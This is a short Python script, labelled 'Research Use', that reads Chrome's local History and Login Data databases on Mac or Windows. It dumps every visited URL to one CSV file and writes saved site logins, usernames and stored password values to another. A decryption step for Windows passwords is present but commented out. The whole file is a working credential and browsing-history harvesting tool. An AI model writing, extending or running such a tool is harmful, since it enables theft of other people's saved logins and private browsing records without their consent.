#Research Use
#Author : Md Anzaruddin


import os
import csv
import sqlite3
#import win32crypt  # For decrypting saved passwords on Windows

# Determine the operating system
if os.name == 'posix':  # Mac
    history_db = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
    login_db = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data')
elif os.name == 'nt':  # Windows
    history_db = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')
    login_db = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
else:
    print('Error: unsupported operating system')
    exit()

# Check if the history and login database files exist
if not os.path.exists(history_db):
    print(f'Error: history database file does not exist at path {history_db}')
    exit()
if not os.path.exists(login_db):
    print(f'Error: login database file does not exist at path {login_db}')
    exit()

# Connect to the history database
try:
    conn = sqlite3.connect(history_db)
    cursor = conn.cursor()
except sqlite3.Error as e:
    print(f'Error connecting to the history database: {e}')
    exit()

# Execute the SQL query to retrieve the browsing history
query = 'SELECT urls.url, visits.visit_time FROM urls, visits WHERE urls.id = visits.url;'
try:
    cursor.execute(query)
except sqlite3.Error as e:
    print(f'Error executing query: {e}')
    exit()

# Create a CSV file to store the browsing history
csv_file = open('history.csv', 'w', newline='')
csv_writer = csv.writer(csv_file)
csv_writer.writerow(['URL', 'Visit Time'])

# Write each history item to the CSV file
for row in cursor.fetchall():
    url = row[0]
    timestamp = row[1]
    csv_writer.writerow([url, timestamp])

# Close the history database connection and the CSV file
cursor.close()
conn.close()
csv_file.close()

print('Browsing history dumped to history.csv')

# Connect to the login database
try:
    conn = sqlite3.connect(login_db)
    cursor = conn.cursor()
except sqlite3.Error as e:
    print(f'Error connecting to the login database: {e}')
    exit()

# Execute the SQL query to retrieve the saved passwords
query = 'SELECT origin_url, username_value, password_value FROM logins;'
try:
    cursor.execute(query)
except sqlite3.Error as e:
    print(f'Error executing query: {e}')
    exit()

# Create a CSV file to store the saved passwords
csv_file = open('passwords.csv', 'w', newline='', encoding='utf-8')
password_csv_writer = csv.writer(csv_file)
password_csv_writer.writerow(['URL', 'Username', 'Password'])

# Decrypt and write each saved password to the CSV file
for row in cursor.fetchall():
    url = row[0]
    username = row[1]
    password_db = row[2]
    #password = win32crypt.CryptUnprotectData(password_db, None, None, None, 0)[1].decode('utf-8')
    password_csv_writer.writerow([url, username, password_db])

# Close the login database connection and the CSV file
cursor.close()
conn.close()
csv_file.close()

print('Saved Passwords Dumped Succesful ')
